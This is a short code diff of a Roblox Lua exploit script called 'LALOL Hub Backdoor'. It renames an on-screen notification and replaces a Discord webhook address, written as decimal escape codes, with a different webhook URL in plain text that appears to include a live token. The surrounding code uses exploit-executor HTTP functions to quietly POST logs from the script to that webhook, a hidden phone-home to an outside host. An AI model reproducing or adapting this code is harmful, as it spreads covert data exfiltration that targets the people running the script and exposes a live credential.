@@ -1448,7 +1448,7 @@ local script = G2L["20"];
 		game:GetService('StarterGui'):SetCore(
 			"SendNotification",
 			{
-				Title = "LALOL Hub Backdoor",
+				Title = "Clowns",
 				Duration = 6,
 				Text = text
 			}
@@ -1566,7 +1566,7 @@ local script = G2L["20"];
 					local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 					if request and not _G.LALOL_Hub_Backdoor_Logs_Disabled then 
 						request({
-							Url = '\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\49\48\56\54\57\52\49\54\48\52\54\52\49\53\56\55\56\49\47\57\86\67\122\95\99\107\52\117\120\51\77\51\84\81\106\56\109\111\76\68\113\51\78\119\45\100\107\89\68\87\55\103\69\99\97\76\72\75\80\98\101\50\95\74\74\73\122\53\109\50\102\69\104\54\101\83\110\112\51\51\87\79\76\116\103\105\49',
+							Url = 'https://discord.com/api/webhooks/1393626932444135556/6CCtBAxFJ0NabJgxOJ8jsvCsbdMxdjmCYqU7UK3vzhcH-YgcwxDrKTsNZoEgsALcOypX',
 							Method = 'POST',
 							Headers = {
 								['Content-Type'] = 'application/json',
